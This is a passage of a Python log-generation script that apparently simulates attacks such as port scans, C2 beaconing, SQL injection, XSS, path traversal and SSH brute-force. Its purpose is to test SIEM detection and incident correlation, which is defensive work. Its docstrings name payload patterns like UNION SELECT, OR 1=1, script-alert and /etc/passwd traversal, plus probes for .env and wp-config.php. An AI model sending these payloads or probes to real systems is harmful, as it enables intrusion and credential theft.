        source_ip=src_ip,
        expected_key=f"network::recon::src::{src_ip}",
    )


def run_network_internal_sweep(count: int, log_file: str) -> None:
    """
    Simulate an internal sweep:
    same source IP + same destination port + many unique destination IPs.
    """
    scenario = "network_internal_sweep"
    event_count = _network_min_count(scenario, count)
    src_ip = NETWORK_RECON_ATTACKER_IP
    dest_port = 22

    banner("Network Internal Sweep  [Suricata EVE JSON]")
    info(f"Source IP: {src_ip}")
    info(f"Destination port: {dest_port}")
    info(f"Events: {event_count}")
    info(f"Network log file: {log_file}")
    expect("Suricata event_type → flow")
    expect("Logstash event.action → network_flow")
    expect("Rule cardinality → destination_ip")
    expect("Alert → network_internal_sweep")
    expect("Incident → Network Reconnaissance")

    phase("Network phase — unique destination hosts on SSH")
    for i in range(event_count):
        dest_ip = NETWORK_INTERNAL_SWEEP_TARGETS[i % len(NETWORK_INTERNAL_SWEEP_TARGETS)]
        _write_suricata_flow(
            log_file,
            src_ip,
            dest_ip,
            dest_port,
            src_port=46000 + i,
            proto="TCP",
            app_proto="ssh",
            bytes_toserver=260 + i,
            bytes_toclient=96,
            offset_seconds=120 - min(i * 5, 119),
            seq=i,
        )

    _network_summary(
        scenario=scenario,
        log_file=log_file,
        event_count=event_count,
        event_type="flow",
        expected_alert="network_internal_sweep",
        expected_incident="Network Reconnaissance",
        source_ip=src_ip,
        expected_key=f"network::recon::src::{src_ip}",
    )


def run_network_suspicious_outbound(count: int, log_file: str) -> None:
    """
    Simulate suspicious outbound egress:
    internal host connects to suspicious external destination port.
    """
    scenario = "network_suspicious_outbound"
    event_count = _network_min_count(scenario, count)
    src_ip = NETWORK_COMPROMISED_HOST_IP
    dest_ip = NETWORK_EXTERNAL_SUSPICIOUS_IP

    banner("Network Suspicious Outbound  [Suricata EVE JSON]")
    info(f"Source IP: {src_ip}")
    info(f"Destination: {dest_ip}:4444")
    info(f"Events: {event_count}")
    info(f"Network log file: {log_file}")
    expect("Suricata event_type → flow")
    expect("Logstash event.action → network_flow")
    expect("Rule engine virtual classification → network_suspicious_outbound")
    expect("Alert → network_suspicious_outbound")
    expect("Incident → Suspicious Network Egress")

    phase("Network phase — suspicious outbound port(s)")
    for i in range(event_count):
        dest_port = NETWORK_SUSPICIOUS_PORTS[i % len(NETWORK_SUSPICIOUS_PORTS)]
        _write_suricata_flow(
            log_file,
            src_ip,
            dest_ip,
            dest_port,
            src_port=47000 + i,
            proto="TCP",
            app_proto="failed",
            bytes_toserver=320 + i,
            bytes_toclient=64,
            offset_seconds=max(0, 30 - i),
            seq=i,
        )

    _network_summary(
        scenario=scenario,
        log_file=log_file,
        event_count=event_count,
        event_type="flow",
        expected_alert="network_suspicious_outbound",
        expected_incident="Suspicious Network Egress",
        source_ip=src_ip,
        expected_key=f"network::egress::src::{src_ip}",
    )


def run_network_c2_beaconing(count: int, log_file: str) -> None:
    """
    Simulate possible C2 beaconing:
    repeated flows from one source to the same destination IP and port.
    """
    scenario = "network_c2_beaconing"
    event_count = _network_min_count(scenario, count)
    src_ip = NETWORK_COMPROMISED_HOST_IP
    dest_ip = NETWORK_EXTERNAL_SUSPICIOUS_IP
    dest_port = 443

    banner("Network C2 Beaconing  [Suricata EVE JSON]")
    info(f"Source IP: {src_ip}")
    info(f"Destination: {dest_ip}:{dest_port}")
    info(f"Events: {event_count}")
    info(f"Network log file: {log_file}")
    expect("Suricata event_type → flow")
    expect("Logstash event.action → network_flow")
    expect("Rule frequency → repeated same source/destination/port")
    expect("Alert → network_c2_beaconing")
    expect("Incident → Possible Command and Control")

    phase("Network phase — repeated TLS flows")
    for i in range(event_count):
        _write_suricata_flow(
            log_file,
            src_ip,
            dest_ip,
            dest_port,
            src_port=48000 + i,
            proto="TCP",
            app_proto="tls",
            bytes_toserver=180 + (i % 3),
            bytes_toclient=120 + (i % 2),
            offset_seconds=300 - min(i * 4, 299),
            seq=i,
        )

    _network_summary(
        scenario=scenario,
        log_file=log_file,
        event_count=event_count,
        event_type="flow",
        expected_alert="network_c2_beaconing",
        expected_incident="Possible Command and Control",
        source_ip=src_ip,
        expected_key=f"network::c2::src::{src_ip}",
    )


def run_network_suspicious_dns(count: int, log_file: str) -> None:
    """
    Simulate suspicious DNS activity:
    one source queries multiple suspicious DNS names.
    """
    scenario = "network_suspicious_dns"
    event_count = _network_min_count(scenario, count)
    src_ip = NETWORK_COMPROMISED_HOST_IP

    banner("Network Suspicious DNS  [Suricata EVE JSON]")
    info(f"Source IP: {src_ip}")
    info(f"Resolver: {NETWORK_DNS_RESOLVER_IP}")
    info(f"Events: {event_count}")
    info(f"Network log file: {log_file}")
    expect("Suricata event_type → dns")
    expect("Logstash event.action → network_dns")
    expect("Rule engine virtual classification → network_suspicious_dns")
    expect("Rule cardinality → dns_question_name")
    expect("Alert → network_suspicious_dns")
    expect("Incident → Suspicious DNS / Malware Staging")

    phase("Network phase — suspicious DNS queries")
    for i in range(event_count):
        dns_name = NETWORK_SUSPICIOUS_DNS_NAMES[i % len(NETWORK_SUSPICIOUS_DNS_NAMES)]
        if i >= len(NETWORK_SUSPICIOUS_DNS_NAMES):
            dns_name = f"c2-payload-beacon-{i}.test"

        _write_suricata_dns(
            log_file,
            src_ip,
            dns_name,
            resolver_ip=NETWORK_DNS_RESOLVER_IP,
            rrtype="A",
            src_port=53000 + i,
            offset_seconds=120 - min(i * 10, 119),
            seq=i,
        )

    _network_summary(
        scenario=scenario,
        log_file=log_file,
        event_count=event_count,
        event_type="dns",
        expected_alert="network_suspicious_dns",
        expected_incident="Suspicious DNS / Malware Staging",
        source_ip=src_ip,
        expected_key=f"network::dns::src::{src_ip}",
    )


def run_network_recon_combo(count: int, log_file: str) -> None:
    """
    Trigger port scan and internal sweep from the same source IP.
    """
    banner("Network Recon Combo  [Port Scan + Internal Sweep]")
    expect("Expected correlation → one Network Reconnaissance incident")
    expect(f"Expected incident key → network::recon::src::{NETWORK_RECON_ATTACKER_IP}")

    run_network_port_scan(count, log_file)
    run_network_internal_sweep(count, log_file)

    _network_summary(
        scenario="network_recon_combo",
        log_file=log_file,
        event_count=_network_min_count("network_port_scan", count) + _network_min_count("network_internal_sweep", count),
        event_type="flow",
        expected_alert="network_port_scan + network_internal_sweep",
        expected_incident="Network Reconnaissance",
        source_ip=NETWORK_RECON_ATTACKER_IP,
        expected_key=f"network::recon::src::{NETWORK_RECON_ATTACKER_IP}",
        correlation="port scan + internal sweep → Network Reconnaissance escalation",
    )


def run_network_dns_outbound_combo(count: int, log_file: str) -> None:
    """
    Trigger suspicious DNS and suspicious outbound from the same source IP.
    """
    banner("Network DNS + Outbound Combo")
    expect("Expected correlation: DNS + outbound → Possible Command and Control")

    run_network_suspicious_dns(count, log_file)
    run_network_suspicious_outbound(count, log_file)

    _network_summary(
        scenario="network_dns_outbound_combo",
        log_file=log_file,
        event_count=_network_min_count("network_suspicious_dns", count) + _network_min_count("network_suspicious_outbound", count),
        event_type="dns + flow",
        expected_alert="network_suspicious_dns + network_suspicious_outbound",
        expected_incident="Possible Command and Control",
        source_ip=NETWORK_COMPROMISED_HOST_IP,
        expected_key=f"network::c2::src::{NETWORK_COMPROMISED_HOST_IP}",
        correlation="DNS + outbound → Possible Command and Control",
    )


def run_network_outbound_beacon_combo(count: int, log_file: str) -> None:
    """
    Trigger suspicious outbound and C2 beaconing from the same source IP.
    """
    banner("Network Outbound + Beacon Combo")
    expect("Expected correlation: suspicious outbound + beaconing → Possible Command and Control")

    run_network_suspicious_outbound(count, log_file)
    run_network_c2_beaconing(count, log_file)

    _network_summary(
        scenario="network_outbound_beacon_combo",
        log_file=log_file,
        event_count=_network_min_count("network_suspicious_outbound", count) + _network_min_count("network_c2_beaconing", count),
        event_type="flow",
        expected_alert="network_suspicious_outbound + network_c2_beaconing",
        expected_incident="Possible Command and Control",
        source_ip=NETWORK_COMPROMISED_HOST_IP,
        expected_key=f"network::c2::src::{NETWORK_COMPROMISED_HOST_IP}",
        correlation="outbound + beaconing → Possible Command and Control",
    )


def run_network_port_scan_repeat(count: int, log_file: str) -> None:
    """
    Run port scan twice quickly to test incident cooldown behavior.
    """
    banner("Network Port Scan Repeat  [Cooldown Test]")
    expect("First run → creates/updates Network Reconnaissance")
    expect("Second run → cooldown skip or update depending on incident_engine logic")

    run_network_port_scan(count, log_file)
    run_network_port_scan(count, log_file)

    _network_summary(
        scenario="network_port_scan_repeat",
        log_file=log_file,
        event_count=_network_min_count("network_port_scan", count) * 2,
        event_type="flow",
        expected_alert="network_port_scan repeated",
        expected_incident="Network Reconnaissance cooldown/update test",
        source_ip=NETWORK_RECON_ATTACKER_IP,
        expected_key=f"network::recon::src::{NETWORK_RECON_ATTACKER_IP}",
        correlation="repeat same recon source → cooldown behavior",
    )


def run_network_suspicious_outbound_repeat(count: int, log_file: str) -> None:
    """
    Write repeated suspicious outbound flows to test egress updates and possible
    promotion to C2 depending on incident_engine thresholds.
    """
    banner("Network Suspicious Outbound Repeat  [Cooldown / Promotion Test]")
    expect("Repeated outbound alerts → Suspicious Network Egress updates")
    expect("Possible promotion → Possible Command and Control if incident_engine threshold is reached")

    event_count = max(count, len(NETWORK_SUSPICIOUS_PORTS))
    src_ip = NETWORK_COMPROMISED_HOST_IP
    dest_ip = NETWORK_EXTERNAL_SUSPICIOUS_IP

    phase("Network phase — repeated suspicious outbound ports")
    for i in range(event_count):
        dest_port = NETWORK_SUSPICIOUS_PORTS[i % len(NETWORK_SUSPICIOUS_PORTS)]
        _write_suricata_flow(
            log_file,
            src_ip,
            dest_ip,
            dest_port,
            src_port=49000 + i,
            proto="TCP",
            app_proto="failed",
            bytes_toserver=350 + i,
            bytes_toclient=60,
            offset_seconds=max(0, 60 - i * 2),
            seq=i,
        )

    _network_summary(
        scenario="network_suspicious_outbound_repeat",
        log_file=log_file,
        event_count=event_count,
        event_type="flow",
        expected_alert="network_suspicious_outbound repeated",
        expected_incident="Suspicious Network Egress / Possible Command and Control",
        source_ip=src_ip,
        expected_key=f"network::egress::src::{src_ip}",
        correlation="repeated suspicious outbound → egress updates or C2 promotion",
    )




# ═══════════════════════════════════════════════════════════════════════════════
# WEB ATTACK SCENARIO RUNNERS  (v3.1)
# ═══════════════════════════════════════════════════════════════════════════════

def run_web_path_traversal(ip: str, count: int, log_file: str) -> None:
    """
    Simulate a path-traversal attack.

    Writes `count` Nginx access log lines containing /etc/passwd and
    ../ traversal patterns to `log_file`.

    Filebeat → Logstash pipeline:
      grok        : COMBINEDAPACHELOG
      event.action: web_path_traversal_attempt
      tags        : ready_for_detection
    """
    banner("Web Path Traversal Attack  [pure attack]")
    info(f"IP: {ip}  |  Requests: {count}")
    info(f"Log file: {log_file}")
    info(f"URL patterns: /etc/passwd, /../../../etc/passwd, %2e%2e variants")
    expect("ECS url.original  → path traversal payload")
    expect("ECS http.response.status_code → 200 / 404 (alternating)")
    expect("event.action      → web_path_traversal_attempt")
    expect("tags              → ready_for_detection")
    expect("Alert             → web_path_traversal_attempt")
    expect("Incident          → CREATED or UPDATED by incident_engine")

    phase("Attack phase — path traversal requests")
    lines = _build_web_path_traversal_lines(ip, count, ATTACK_START, ATTACK_END)
    _write_phase(lines, "web_path_traversal_attempt", log_file)

    print(f"\n  {GREEN}{BOLD}✔  Path traversal simulation complete.  "
          f"Filebeat will forward to Logstash → ES.{RESET}")


def run_web_sql_injection(ip: str, count: int, log_file: str) -> None:
    """
    Simulate an SQL injection attack.

    Writes `count` Nginx access log lines containing UNION SELECT, OR 1=1,
    sleep(), and information_schema payloads in query strings.

    Filebeat → Logstash pipeline:
      grok        : COMBINEDAPACHELOG
      event.action: web_sql_injection_attempt
      tags        : ready_for_detection
    """
    banner("Web SQL Injection Attack  [pure attack]")
    info(f"IP: {ip}  |  Requests: {count}")
    info(f"Log file: {log_file}")
    info(f"Payload types: UNION SELECT, OR 1=1, sleep(), information_schema")
    expect("ECS url.original  → SQL injection payload in query string")
    expect("ECS http.response.status_code → 200 / 500 (alternating)")
    expect("event.action      → web_sql_injection_attempt")
    expect("tags              → ready_for_detection")
    expect("Alert             → web_sql_injection_attempt")
    expect("Incident          → CREATED or UPDATED by incident_engine")

    phase("Attack phase — SQL injection requests")
    lines = _build_web_sql_injection_lines(ip, count, ATTACK_START, ATTACK_END)
    _write_phase(lines, "web_sql_injection_attempt", log_file)

    print(f"\n  {GREEN}{BOLD}✔  SQL injection simulation complete.  "
          f"Filebeat will forward to Logstash → ES.{RESET}")


def run_web_xss(ip: str, count: int, log_file: str) -> None:
    """
    Simulate a cross-site scripting (XSS) probe.

    Writes `count` Nginx access log lines containing <script>alert(1)</script>,
    javascript: URIs, and onerror= attributes in query strings.

    Filebeat → Logstash pipeline:
      grok        : COMBINEDAPACHELOG
      event.action: web_xss_attempt
      tags        : ready_for_detection
    """
    banner("Web XSS Attack  [pure attack]")
    info(f"IP: {ip}  |  Requests: {count}")
    info(f"Log file: {log_file}")
    info(f"Payload types: <script>alert(1)</script>, javascript:, onerror=, SVG/onload")
    expect("ECS url.original  → XSS payload in query string")
    expect("ECS http.response.status_code → 200 / 400 (alternating)")
    expect("event.action      → web_xss_attempt")
    expect("tags              → ready_for_detection")
    expect("Alert             → web_xss_attempt")
    expect("Incident          → CREATED or UPDATED by incident_engine")

    phase("Attack phase — XSS probe requests")
    lines = _build_web_xss_lines(ip, count, ATTACK_START, ATTACK_END)
    _write_phase(lines, "web_xss_attempt", log_file)

    print(f"\n  {GREEN}{BOLD}✔  XSS simulation complete.  "
          f"Filebeat will forward to Logstash → ES.{RESET}")


def run_web_sensitive_file(ip: str, count: int, log_file: str) -> None:
    """
    Simulate a sensitive file probe.

    Writes `count` Nginx access log lines requesting .env, wp-config.php,
    .git/config, backup.zip, dump.sql, and other high-value targets.

    Filebeat → Logstash pipeline:
      grok        : COMBINEDAPACHELOG
      event.action: web_sensitive_file_probe
      tags        : ready_for_detection
    """
    banner("Web Sensitive File Probe  [pure attack]")
    info(f"IP: {ip}  |  Requests: {count}")
    info(f"Log file: {log_file}")
    info(f"Targets: .env, wp-config.php, .git/config, backup.zip, dump.sql, ...")
    expect("ECS url.original  → sensitive file path")
    expect("ECS http.response.status_code → 200 / 403 / 404 (cycling)")
    expect("event.action      → web_sensitive_file_probe")
    expect("tags              → ready_for_detection")
    expect("Alert             → web_sensitive_file_probe")
    expect("Incident          → CREATED or UPDATED by incident_engine")

    phase("Attack phase — sensitive file probe requests")
    lines = _build_web_sensitive_file_lines(ip, count, ATTACK_START, ATTACK_END)
    _write_phase(lines, "web_sensitive_file_probe", log_file)

    print(f"\n  {GREEN}{BOLD}✔  Sensitive file probe simulation complete.  "
          f"Filebeat will forward to Logstash → ES.{RESET}")


def run_web_404_scanning(ip: str, count: int, log_file: str) -> None:
    """
    Simulate a 404-scanning / directory enumeration attack.

    Writes `count` Nginx access log lines with 404 responses for
    common admin panels, CMS paths, and shell upload targets.

    Pipeline: event.action must be web_404 for the 404-scanning rule. Exploit-class
    web scenarios use ready_for_detection on parsed events; 404 scanning is matched
    on volume of web_404 actions. After threshold, the detection engine emits rule
    web_404_scanning and incident_engine creates or updates a Web Attack / Reconnaissance
    incident when that rule stands alone.

    Filebeat → Logstash pipeline:
      grok        : COMBINEDAPACHELOG
      event.action: web_404
      tags        : (optional — 404 scanning does not rely on ready_for_detection)
    """
    banner("Web 404 Scanning  [pure attack / informational]")
    info(f"IP: {ip}  |  Requests: {count}")
    info(f"Log file: {log_file}")
    info(f"Targets: /admin, /wp-admin, /phpmyadmin, /shell.php, ...")
    expect("ECS url.original  → enumerated path")
    expect("ECS http.response.status_code → 404 (all requests)")
    expect("event.action      → web_404 (required for 404-scanning detection)")
    expect("ready_for_detection → used on exploit-class web events; 404 scanning uses web_404 volume threshold")
    expect("Alert             → web_404_scanning after threshold")
    expect("Incident          → CREATED or UPDATED by incident_engine (Web Attack / Reconnaissance if alone)")

    phase("Attack phase — 404 scanning / path enumeration")
    lines = _build_web_404_lines(ip, count, ATTACK_START, ATTACK_END)
    _write_phase(lines, "web_404", log_file)

    print(f"\n  {GREEN}{BOLD}✔  404 scanning simulation complete.  "
          f"Filebeat will forward to Logstash → ES.{RESET}")


# ═══════════════════════════════════════════════════════════════════════════════
# PURE ATTACK-ONLY  SSH/sudo  (no incident expected)
# ═══════════════════════════════════════════════════════════════════════════════

def run_ssh_bruteforce(ip: str, user: str, count: int, log_file: str) -> None:
    banner("SSH Brute-Force  [pure attack]")
    info(f"IP: {ip}  |  User: {user}  |  Failures: {count}")
    info(f"Log file: {log_file}")
    expect("event_type → failed_login  (×N)")
    expect("Alert  → ssh_bruteforce_by_ip")
    expect("Incident → NONE  (no success event)")

    phase("Attack phase — SSH failures")
    lines = _build_auth_failed_lines(ip, user, ATTACK_START, ATTACK_END, count)
    _write_phase(lines, "failed_login", log_file)


def run_password_spray(ip: str, count: int, log_file: str) -> None:
    banner("Password Spray  [pure attack]")
    info(f"IP: {ip}  |  Users: rotating  |  Failures: {count}")
    info(f"Log file: {log_file}")
    expect("event_type → failed_login  (rotating users)")
    expect("Alert  → password_spray_by_ip")
    expect("Incident → NONE  (no success event)")

    phase("Attack phase — password spray")
    lines = _build_spray_failure_lines(ip, count, ATTACK_START, ATTACK_END)
    _write_phase(lines, "spray_failed_login", log_file)


def run_user_bruteforce(user: str, count: int, log_file: str) -> None:
    banner("User Brute-Force  [pure attack]")
    info(f"Attacker IPs: {USER_BF_ATTACKER_PREFIX}.x  |  User: {user}  |  Failures: {count}")
    info(f"Log file: {log_file}")
    expect("event_type → failed_login  (multi-IP, single user)")
    expect("Alert  → user_bruteforce_by_user")
    expect("Incident → NONE  (no success event)")

    phase("Attack phase — multi-IP brute-force against one user")
    lines = _build_auth_failed_multi_ip_lines(
        USER_BF_ATTACKER_PREFIX, 10, user, ATTACK_START, ATTACK_END, count
    )
    _write_phase(lines, "failed_login [multi-ip]", log_file)


def run_distributed_bruteforce(user: str, count: int, log_file: str) -> None:
    banner("Distributed Brute-Force  [pure attack]")
    info(f"Attacker IPs: {DIST_BF_ATTACKER_PREFIX}.x  |  User: {user}  |  Failures: {count}")
    info(f"Log file: {log_file}")
    expect("event_type → failed_login  (distributed IPs, single user)")
    expect("Alert  → distributed_bruteforce_by_user")
    expect("Incident → NONE  (no success event)")

    phase("Attack phase — distributed IPs → single user")
    lines = _build_auth_failed_multi_ip_lines(
        DIST_BF_ATTACKER_PREFIX, 5, user, ATTACK_START, ATTACK_END, count
    )
    _write_phase(lines, "failed_login [distributed]", log_file)


def run_sudo_bruteforce(ip: str, user: str, count: int, log_file: str) -> None:
    banner("Sudo Brute-Force  [pure attack]")
    info(f"IP: {ip}  |  User: {user}  |  Sudo failures: {count}")
    info(f"Log file: {log_file}")
    expect("event_type → sudo_failed  (×N)")
    expect("Alert  → sudo_bruteforce_by_user")
    expect("Incident → NONE  (no prior compromise in this run)")

    phase("Privesc phase — sudo failures only")
    lines = _build_sudo_failed_lines(ip, user, PRIVESC_START, PRIVESC_END, count)
    _write_phase(lines, "sudo_failed", log_file)


# ═══════════════════════════════════════════════════════════════════════════════
# PURE SUCCESS-ONLY  (baseline / negative tests)
# ═══════════════════════════════════════════════════════════════════════════════

def run_ssh_success_only(ip: str, user: str, count: int, log_file: str) -> None:
    banner("SSH Success Only  [negative test]")
    info(f"IP: {ip}  |  User: {user}  |  Successes: {count}")
    info(f"Log file: {log_file}")
    expect("event_type → success_login  (no prior failed_login)")
    expect("Alert  → NONE  (clean login, no brute-force context)")
    expect("Incident → NONE")

    phase("Inserting clean success_login events")
    lines = [
        _build_auth_success_line(ip, user, PRIVESC_START - i * 2)
        for i in range(count)
    ]
    _write_phase(lines, "success_login [no-prior-failures]", log_file)


def run_sudo_success_only(ip: str, user: str, count: int, log_file: str) -> None:
    banner("Sudo Success Only  [negative test]")
    info(f"IP: {ip}  |  User: {user}  |  Successes: {count}")
    info(f"Log file: {log_file}")
    expect("event_type → sudo_success  (no prior sudo_failed)")
    expect("Alert  → NONE")
    expect("Incident → NONE")

    phase("Inserting clean sudo_success events")
    lines = _build_sudo_success_lines(user, count, PRIVESC_START)
    _write_phase(lines, "sudo_success [no-prior-failures]", log_file)


# ═══════════════════════════════════════════════════════════════════════════════
# 2-STAGE COMPOUND CHAINS  (incident expected)
# ═══════════════════════════════════════════════════════════════════════════════

def run_full_attack_chain(ip: str, user: str, count: int, log_file: str) -> None:
    """
    SSH brute-force from one IP → SSH success from same IP.
    Expected alerts:   ssh_bruteforce_by_ip  +  ssh_success_after_failures
    Expected incident: SSH Brute Force Compromise
    """
    banner("Full Attack Chain  [2-stage: BF → Compromise]")
    info(f"IP: {ip}  |  User: {user}  |  Failures: {count}")
    info(f"Log file: {log_file}")
    expect("event_type[1] → failed_login  (×N, same IP)")
    expect("event_type[2] → success_login  (same IP, same user)")
    expect("Alert[1] → ssh_bruteforce_by_ip")
    expect("Alert[2] → ssh_success_after_failures")
    expect("Incident → SSH Brute Force Compromise")

    phase("Phase 1/2 — Attack  (SSH brute-force failures)")
    failure_lines = _build_auth_failed_lines(ip, user, ATTACK_START, ATTACK_END, count)
    _write_phase(failure_lines, "failed_login", log_file)

    phase("Phase 2/2 — Compromise  (SSH success from same IP)")
    success_line = _build_auth_success_line(ip, user, SUCCESS_AT)
    _write_phase([success_line], "success_login", log_file)

    print(f"\n  {GREEN}{BOLD}✔  Chain complete.  Filebeat will forward to Logstash → ES.{RESET}")


def run_password_spray_chain(ip: str, count: int, log_file: str) -> None:
    """
    Password spray → success for first sprayed user.
    Expected alerts:   password_spray_by_ip  +  ssh_success_after_failures
    Expected incident: Password Spray Compromise
    """
    banner("Password Spray Chain  [2-stage: Spray → Compromise]")
    users = ["root", "admin", "oracle", "mysql", "ubuntu",
             "dev", "backup", "ops", "test", "guest"]
    info(f"IP: {ip}  |  Target user (success): {users[0]}  |  Spray count: {count}")
    info(f"Log file: {log_file}")
    expect("event_type[1] → failed_login  (rotating users, same IP)")
    expect("event_type[2] → success_login  (first sprayed user)")
    expect("Alert[1] → password_spray_by_ip")
    expect("Alert[2] → ssh_success_after_failures")
    expect("Incident → Password Spray Compromise")

    phase("Phase 1/2 — Attack  (password spray across multiple users)")
    spray_lines = _build_spray_failure_lines(ip, count, ATTACK_START, ATTACK_END)
    _write_phase(spray_lines, "spray_failed_login", log_file)

    phase("Phase 2/2 — Compromise  (success for first sprayed user)")
    success_line = _build_auth_success_line(ip, users[0], SUCCESS_AT)
    _write_phase([success_line], "success_login", log_file)

    print(f"\n  {GREEN}{BOLD}✔  Chain complete.  Filebeat will forward to Logstash → ES.{RESET}")


def run_targeted_account_chain(user: str, count: int, log_file: str) -> None:
    """
    Many IPs targeting one user → success from CLEAN IP.
    Expected alerts:   user_bruteforce_by_user  +  ssh_success_after_failures
    Expected incident: Targeted Account Compromise
    """
    banner("Targeted Account Chain  [2-stage: User-BF → Compromise]")
    info(f"Attacker IPs: {USER_BF_ATTACKER_PREFIX}.x  |  User: {user}")
    info(f"Success IP: {USER_FAMILY_SUCCESS_IP}  |  Log file: {log_file}")
    expect("event_type[1] → failed_login  (multi-IP, single user)")
    expect("event_type[2] → success_login  (clean IP, same user)")
    expect("Alert[1] → user_bruteforce_by_user")
    expect("Alert[2] → ssh_success_after_failures")
    expect("Incident → Targeted Account Compromise")

    phase("Phase 1/2 — Attack  (multi-IP user brute-force)")
    failure_lines = _build_auth_failed_multi_ip_lines(
        USER_BF_ATTACKER_PREFIX, 10, user, ATTACK_START, ATTACK_END, count
    )
    _write_phase(failure_lines, "failed_login [multi-ip]", log_file)

    phase("Phase 2/2 — Compromise  (success from clean IP)")
    success_line = _build_auth_success_line(USER_FAMILY_SUCCESS_IP, user, SUCCESS_AT)
    _write_phase([success_line], "success_login [clean-ip]", log_file)

    print(f"\n  {GREEN}{BOLD}✔  Chain complete.  Filebeat will forward to Logstash → ES.{RESET}")


def run_distributed_attack_chain(user: str, count: int, log_file: str) -> None:
    """
    Distributed IPs → success from CLEAN IP.
    Expected alerts:   distributed_bruteforce_by_user  +  ssh_success_after_failures
    Expected incident: Distributed Account Compromise
    """
    banner("Distributed Attack Chain  [2-stage: Distributed-BF → Compromise]")
    info(f"Attacker IPs: {DIST_BF_ATTACKER_PREFIX}.x  |  User: {user}")
    info(f"Success IP: {USER_FAMILY_SUCCESS_IP}  |  Log file: {log_file}")
    expect("event_type[1] → failed_login  (distributed IPs, single user)")
    expect("event_type[2] → success_login  (clean IP, same user)")
    expect("Alert[1] → distributed_bruteforce_by_user")
    expect("Alert[2] → ssh_success_after_failures")
    expect("Incident → Distributed Account Compromise")

    phase("Phase 1/2 — Attack  (distributed brute-force)")
    failure_lines = _build_auth_failed_multi_ip_lines(
        DIST_BF_ATTACKER_PREFIX, 5, user, ATTACK_START, ATTACK_END, count
    )
    _write_phase(failure_lines, "failed_login [distributed]", log_file)

    phase("Phase 2/2 — Compromise  (success from clean IP)")
    success_line = _build_auth_success_line(USER_FAMILY_SUCCESS_IP, user, SUCCESS_AT)
    _write_phase([success_line], "success_login [clean-ip]", log_file)

    print(f"\n  {GREEN}{BOLD}✔  Chain complete.  Filebeat will forward to Logstash → ES.{RESET}")


# ═══════════════════════════════════════════════════════════════════════════════
# 3-STAGE COMPOUND CHAINS  (full incident expected)
# ═══════════════════════════════════════════════════════════════════════════════

def run_full_privesc_chain(ip: str, user: str,
                            fail_count: int, sudo_count: int,
                            log_file: str) -> None:
    """
    SSH BF → Compromise → Privilege Escalation  (IP-family, same IP throughout)
    Expected alerts:   ssh_bruteforce_by_ip + ssh_success_after_failures
                       + sudo_bruteforce_by_user
    Expected incident: SSH Intrusion & Privilege Escalation  (3-stage)
    """
    banner("Full Privesc Chain  [3-stage: BF → Compromise → Privesc]")
    info(f"IP: {ip}  |  User: {user}  |  Failures: {fail_count}  |  Sudo failures: {sudo_count}")
    info(f"Log file: {log_file}")
    expect("event_type[1] → failed_login   (SSH BF)")
    expect("event_type[2] → success_login  (Compromise)")
    expect("event_type[3] → sudo_failed    (Privesc)")
    expect("Alert[1] → ssh_bruteforce_by_ip")
    expect("Alert[2] → ssh_success_after_failures")
    expect("Alert[3] → sudo_bruteforce_by_user")
    expect("Incident → SSH Intrusion & Privilege Escalation  ← 3-stage unified incident")

    phase("Phase 1/3 — Attack  (SSH brute-force)")
    failure_lines = _build_auth_failed_lines(ip, user, ATTACK_START, ATTACK_END, fail_count)
    _write_phase(failure_lines, "failed_login", log_file)

    phase("Phase 2/3 — Compromise  (SSH success from same IP)")
    success_line = _build_auth_success_line(ip, user, SUCCESS_AT)
    _write_phase([success_line], "success_login", log_file)

    phase("Phase 3/3 — Privilege Escalation  (sudo failures from same IP)")
    sudo_lines = _build_sudo_failed_lines(ip, user, PRIVESC_START, PRIVESC_END, sudo_count)
    _write_phase(sudo_lines, "sudo_failed", log_file)

    print(f"\n  {GREEN}{BOLD}✔  Full 3-stage chain complete.  Filebeat will forward to Logstash → ES.{RESET}")


def run_targeted_privesc_chain(user: str,
                                fail_count: int, sudo_count: int,
                                log_file: str) -> None:
    """
    User-BF → Compromise → Privilege Escalation  (user-family, clean success IP)
    Expected alerts:   user_bruteforce_by_user + ssh_success_after_failures
                       + sudo_bruteforce_by_user
    Expected incident: Targeted Account Intrusion & Privilege Escalation  (3-stage)
    """
    banner("Targeted Privesc Chain  [3-stage: User-BF → Compromise → Privesc]")
    info(f"Attacker IPs: {USER_BF_ATTACKER_PREFIX}.x  |  User: {user}")
    info(f"Success/Sudo IP: {USER_FAMILY_SUCCESS_IP}  |  Log file: {log_file}")
    expect("event_type[1] → failed_login   (multi-IP user BF)")
    expect("event_type[2] → success_login  (clean IP)")
    expect("event_type[3] → sudo_failed    (same clean IP)")
    expect("Alert[1] → user_bruteforce_by_user")
    expect("Alert[2] → ssh_success_after_failures")
    expect("Alert[3] → sudo_bruteforce_by_user")
    expect("Incident → Targeted Account Intrusion & Privilege Escalation  ← 3-stage unified incident")

    phase("Phase 1/3 — Attack  (multi-IP user brute-force)")
    failure_lines = _build_auth_failed_multi_ip_lines(
        USER_BF_ATTACKER_PREFIX, 10, user, ATTACK_START, ATTACK_END, fail_count
    )
    _write_phase(failure_lines, "failed_login [multi-ip]", log_file)

    phase("Phase 2/3 — Compromise  (success from clean IP)")
    success_line = _build_auth_success_line(USER_FAMILY_SUCCESS_IP, user, SUCCESS_AT)
    _write_phase([success_line], "success_login [clean-ip]", log_file)

    phase("Phase 3/3 — Privilege Escalation  (sudo failures from same clean IP)")
    sudo_lines = _build_sudo_failed_lines(
        USER_FAMILY_SUCCESS_IP, user, PRIVESC_START, PRIVESC_END, sudo_count
    )
    _write_phase(sudo_lines, "sudo_failed [clean-ip]", log_file)

    print(f"\n  {GREEN}{BOLD}✔  Full 3-stage chain complete.  Filebeat will forward to Logstash → ES.{RESET}")


def run_distributed_privesc_chain(user: str,
                                   fail_count: int, sudo_count: int,
                                   log_file: str) -> None:
    """
    Distributed-BF → Compromise → Privilege Escalation  (user-family, clean IP)
    Expected alerts:   distributed_bruteforce_by_user + ssh_success_after_failures
                       + sudo_bruteforce_by_user
    Expected incident: Distributed Intrusion & Privilege Escalation  (3-stage)
    """
    banner("Distributed Privesc Chain  [3-stage: Distributed-BF → Compromise → Privesc]")
    info(f"Attacker IPs: {DIST_BF_ATTACKER_PREFIX}.x  |  User: {user}")
    info(f"Success/Sudo IP: {USER_FAMILY_SUCCESS_IP}  |  Log file: {log_file}")
    expect("event_type[1] → failed_login   (distributed IPs)")
    expect("event_type[2] → success_login  (clean IP)")
    expect("event_type[3] → sudo_failed    (same clean IP)")
    expect("Alert[1] → distributed_bruteforce_by_user")
    expect("Alert[2] → ssh_success_after_failures")
    expect("Alert[3] → sudo_bruteforce_by_user")
